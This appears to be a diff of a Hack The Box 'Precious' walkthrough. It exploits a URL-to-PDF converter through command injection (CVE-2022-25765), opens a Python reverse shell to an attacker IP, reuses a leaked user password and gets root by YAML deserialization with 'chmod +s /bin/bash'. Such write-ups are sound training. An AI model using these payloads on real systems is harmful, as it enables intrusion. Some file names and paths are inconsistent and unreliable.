@@ -1,3 +1,77 @@
-python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.166",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'
+nmap -p- $IP
+
+nmap -sV -sC -p22,80 $IP
+
+Host is up (0.084s latency).
+Not shown: 998 closed tcp ports (conn-refused)
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
+| ssh-hostkey: 
+|   3072 845e13a8e31e20661d235550f63047d2 (RSA)
+|   256 a2ef7b9665ce4161c467ee4e96c7c892 (ECDSA)
+|_  256 33053dcd7ab798458239e7ae3c91a658 (ED25519)
+80/tcp open  http    nginx 1.18.0
+|_http-title: Did not follow redirect to http://precious.htb/
+|_http-server-header: nginx/1.18.0
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Nmap reveals that 80 and 22 ports are open and 80 port redirect us to precious.htb
+
+There is a simple web page convertor which take the URL as input and give the PDF as output
+
+python3 -m http.server 80 in our attacker machine
+
+Input the IP of our attacker machine on the webpage
+
+And it's converted the webpage into PDF as expected, let's download the PDF
+
+CVE-2022-25765
+Searching that on Google I found a command injection vulnerability. After reading the POC I got to known that we can use any get parameter name and inside that use the backticks to injection our command.
+
+http://$IP/?name=%20`id`
+
+we use python to get a reverse shell
+
+python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("$IP",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'
+
+Ruby To Henry User
+In the ruby user directory, I found a folder called .bundle which has the henry user password in it.
 
 henry:Q3c1AqGHtoI0aXAYFH
+
+
+Privilege Escalation
+
+we run first sudo -l and we get a update_dependencies.rb file which we can run as root user
+Matching Defaults entries for henry on precious:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+User henry may run the following commands on precious:
+    (root) NOPASSWD: /usr/bin/ruby /opt/update_dependencies.rb
+
+Checking the file, we're going to known that it's using YAML.load which is vulnerable to YAML Deserialization Attack.
+
+https://blog.stratumsecurity.com/2021/06/09/blind-remote-code-execution-through-yaml-deserialization/
+write the dependencies.yml file inside henry folder
+
+we change the "git_set: $command" value.
+
+git_set: id
+
+henry@precious:~$ /usr/bin/ruby /opt/update_dependencies.rb 
+sh: 1: reading: not found
+uid=1000(henry) gid=1000(henry) groups=1000(henry)
+
+to get the flag we can change the value of git_set to:
+git_set: "cat /root.txt"
+
+sudo /usr/bin/ruby /opt/update_dependencies.yml
+and we get the flag.
+
+to get root we can change the value of git_set to:
+git_set: "chmod +s /bin/bash"
+
+sudo /usr/bin/ruby /opt/update_dependencies.yml
+bash -p 
+
+we got root.
